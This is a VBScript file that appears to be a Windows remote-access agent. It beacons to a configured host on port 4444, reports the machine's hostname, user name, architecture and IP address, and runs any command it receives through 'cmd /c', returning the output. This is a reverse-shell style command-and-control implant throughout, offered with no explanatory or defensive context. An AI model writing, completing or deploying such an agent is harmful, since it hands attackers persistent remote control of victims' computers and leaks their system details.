Dim serverHost, serverPort
serverHost = "0.0.0.0"
serverPort = 4444

Do While True
On Error Resume Next

Set objShell = CreateObject("WScript.Shell")
Set objNetwork = CreateObject("WScript.Network")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objHTTP.open "GET", "http://" & serverHost & ":" & serverPort, False
objHTTP.send

If Err.Number <> 0 Then
WScript.Sleep 5000
Err.Clear
Else
Set objSocket = CreateObject("MSWinsock.Winsock")
objSocket.RemoteHost = serverHost
objSocket.RemotePort = serverPort
objSocket.Connect

WScript.Sleep 1000

If objSocket.State = 7 Then
strKey = objSocket.GetData

strHostname = objNetwork.ComputerName
strUser = objNetwork.UserName
strOS = "Windows"

Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_Processor")
For Each objItem in colItems
strArch = objItem.Architecture
Next

Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
For Each objItem in colItems
If Not IsNull(objItem.IPAddress) Then
strAgentIP = objItem.IPAddress(0)
Exit For
End If
Next

strInfo = "{""os"":""" & strOS & """,""hostname"":""" & strHostname & """,""user"":""" & strUser & """,""architecture"":""" & strArch & """,""agentIP"":""" & strAgentIP & """}"

objSocket.SendData strInfo
WScript.Sleep 500

Do While objSocket.State = 7
If objSocket.BytesReceived > 0 Then
strCommand = objSocket.GetData

If InStr(strCommand, "SYSINFO") > 0 Then
strOutput = "OS: " & strOS & vbCrLf
strOutput = strOutput & "Hostname: " & strHostname & vbCrLf
strOutput = strOutput & "User: " & strUser & vbCrLf
strOutput = strOutput & "Arch: " & strArch & vbCrLf
strOutput = strOutput & "Agent IP: " & strAgentIP
ElseIf InStr(strCommand, "SCREENSHOT") > 0 Then
strOutput = "ERROR: Screenshot not supported in VBS agent"
Else
Set objExec = objShell.Exec("cmd /c " & strCommand & " 2>&1")
strOutput = ""
Do While Not objExec.StdOut.AtEndOfStream
strOutput = strOutput & objExec.StdOut.ReadLine() & vbCrLf
Loop
If strOutput = "" Then
strOutput = "Command executed (no output)"
End If
End If

objSocket.SendData strOutput & "<END>"
End If
WScript.Sleep 100
Loop

objSocket.Close
End If
End If

WScript.Sleep 5000
Loop